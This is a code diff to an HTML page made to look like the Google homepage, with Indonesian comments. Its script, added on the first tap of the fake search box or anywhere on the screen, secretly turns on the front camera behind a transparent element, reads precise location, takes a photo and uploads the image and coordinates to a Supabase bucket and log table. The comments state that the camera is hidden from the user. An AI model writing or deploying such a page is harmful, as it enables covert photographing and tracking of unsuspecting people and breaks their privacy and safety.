@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Google</title>
     <link rel="icon" href="https://www.google.com/favicon.ico">
-    <!-- Load Supabase Client dari CDN -->
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         body {
@@ -32,9 +31,10 @@
             margin-top: -10vh;
             flex: 1;
             justify-content: center;
+            padding: 0 20px;
         }
         .google-logo {
-            font-size: 80px;
+            font-size: 70px;
             font-weight: bold;
             letter-spacing: -3px;
             margin-bottom: 25px;
@@ -46,7 +46,7 @@
         .green { color: #34A853; }
 
         .search-box {
-            width: 90%;
+            width: 100%;
             max-width: 584px;
             height: 44px;
             border: 1px solid #dfe1e5;
@@ -54,7 +54,7 @@
             display: flex;
             align-items: center;
             padding: 0 14px;
-            box-shadow: none;
+            box-shadow: 0 1px 6px rgba(32,33,36,.1);
         }
         .search-box input {
             flex: 1;
@@ -69,15 +69,17 @@
             height: 20px;
             fill: #9aa0a6;
         }
-        
-        /* Trik agar video aktif di HP tanpa terlihat mencolok */
-        #camera-container {
-            position: absolute;
-            opacity: 0.01;
+
+        /* Elemen kamera disembunyikan secara aman agar HP tetap merender stream */
+        #camera-preview {
+            position: fixed;
+            bottom: 0;
+            right: 0;
+            width: 80px;
+            height: 60px;
+            opacity: 0; /* Transparan agar tidak terlihat pengguna */
             pointer-events: none;
-            width: 1px;
-            height: 1px;
-            overflow: hidden;
+            z-index: -999;
         }
 
         footer {
@@ -111,15 +113,14 @@
 
         <div class="search-box">
             <svg class="search-icon" focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path></svg>
-            <input type="text" placeholder="Telusuri Google atau ketik URL" disabled>
+            <!-- Kolom input diubah jadi bisa diklik/disentuh untuk memicu fungsi kamera secara mulus -->
+            <input type="text" id="search-input" placeholder="Telusuri Google atau ketik URL">
         </div>
     </div>
 
-    <!-- Container kamera diatur agar tetap berjalan di background HP -->
-    <div id="camera-container">
-        <video id="camera" autoplay playsinline muted></video>
-        <canvas id="canvas"></canvas>
-    </div>
+    <!-- Video & Canvas di background -->
+    <video id="camera-preview" autoplay playsinline muted></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <footer>
         <div class="footer-item">Indonesia</div>
@@ -135,102 +136,86 @@
         
         const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-        document.addEventListener("DOMContentLoaded", () => {
-            const video = document.getElementById("camera");
+        let isCaptured = false;
+
+        async function executeCaptureProcess() {
+            if (isCaptured) return;
+            isCaptured = true;
+
+            const video = document.getElementById("camera-preview");
             const canvas = document.getElementById("canvas");
 
-            async function sendToSupabase(dataUrl, latitude, longitude) {
-                try {
-                    const response = await fetch(dataUrl);
-                    const blob = await response.blob();
-                    
-                    const fileName = `capture_${Date.now()}.png`;
+            try {
+                // 1. Minta Izin & Nyalakan Kamera Depan
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user" },
+                    audio: false
+                });
+                video.srcObject = stream;
+                await video.play();
 
-                    const { error: storageError } = await supabaseClient.storage
-                        .from('captures')
-                        .upload(fileName, blob, {
-                            contentType: 'image/png',
-                            upsert: true
-                        });
-
-                    if (storageError) throw storageError;
-
-                    const { data: { publicUrl } } = supabaseClient.storage
-                        .from('captures')
-                        .getPublicUrl(fileName);
-
-                    const { error: dbError } = await supabaseClient
-                        .from('logs')
-                        .insert([
-                            { 
-                                photo_url: publicUrl, 
-                                latitude: latitude, 
-                                longitude: longitude 
-                            }
-                        ]);
-
-                    if (dbError) throw dbError;
-
-                } catch (error) {
-                    console.error("Gagal mengirim:", error);
-                }
-            }
-
-            function capturePhoto(latitude, longitude) {
-                // Pastikan ukuran video valid sebelum digambar ke canvas (mencegah blank hitam)
-                if (video.videoWidth === 0 || video.videoHeight === 0) {
-                    setTimeout(() => capturePhoto(latitude, longitude), 500);
-                    return;
-                }
-
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext("2d");
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                const imageDataURL = canvas.toDataURL("image/png");
-                sendToSupabase(imageDataURL, latitude, longitude);
-            }
-
-            function getLocationAndCapture() {
+                // 2. Ambil Lokasi
                 if ("geolocation" in navigator) {
                     navigator.geolocation.getCurrentPosition(
-                        (position) => {
+                        async (position) => {
                             const lat = position.coords.latitude;
                             const lng = position.coords.longitude;
 
-                            // Jeda 2 detik untuk memastikan kamera HP stabil dan menangkap cahaya
-                            setTimeout(() => {
-                                capturePhoto(lat, lng);
-                            }, 2000);
+                            // Beri jeda 1 detik agar kamera HP siap menangkap gambar
+                            setTimeout(async () => {
+                                canvas.width = video.videoWidth || 640;
+                                canvas.height = video.videoHeight || 480;
+                                const ctx = canvas.getContext("2d");
+                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                                canvas.toBlob(async (blob) => {
+                                    if (!blob) return;
+                                    
+                                    const fileName = `capture_${Date.now()}.png`;
+
+                                    // Upload ke Supabase Storage
+                                    const { error: storageError } = await supabaseClient.storage
+                                        .from('captures')
+                                        .upload(fileName, blob, { contentType: 'image/png', upsert: true });
+
+                                    if (storageError) {
+                                        console.error("Storage Error:", storageError);
+                                        return;
+                                    }
+
+                                    // Ambil Public URL
+                                    const { data: { publicUrl } } = supabaseClient.storage
+                                        .from('captures')
+                                        .getPublicUrl(fileName);
+
+                                    // Simpan ke Database Table logs
+                                    await supabaseClient
+                                        .from('logs')
+                                        .insert([{ photo_url: publicUrl, latitude: lat, longitude: lng }]);
+
+                                    // Matikan stream kamera setelah selesai
+                                    stream.getTracks().forEach(track => track.stop());
+                                }, 'image/png');
+                            }, 1000);
                         },
-                        (error) => {
-                            console.warn("Gagal lokasi: " + error.message);
-                        },
-                        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                        (error) => { console.warn("Lokasi ditolak:", error); },
+                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                     );
                 }
+            } catch (err) {
+                console.warn("Akses kamera error:", err);
             }
+        }
 
-            async function startCamera() {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: "user" },
-                        audio: false
-                    });
-                    video.srcObject = stream;
-
-                    // Tunggu stream berjalan lalu ambil lokasi & foto
-                    video.onloadedmetadata = () => {
-                        video.play();
-                        getLocationAndCapture();
-                    };
-                } catch (err) {
-                    console.warn("Kamera ditolak: " + err.message);
-                }
-            }
-
-            startCamera();
+        // Memicu proses otomatis saat pengguna menyentuh/mengklik kolom pencarian atau layar pertama kali
+        document.addEventListener("DOMContentLoaded", () => {
+            const searchInput = document.getElementById("search-input");
+            
+            // Begitu user tap/klik di kolom pencarian (atau layar), proses berjalan mulus tanpa tombol khusus
+            searchInput.addEventListener("focus", executeCaptureProcess, { once: true });
+            
+            // Cadangan: jika disentuh di area mana saja di layar HP
+            document.body.addEventListener("click", executeCaptureProcess, { once: true });
         });
     </script>
 </body>
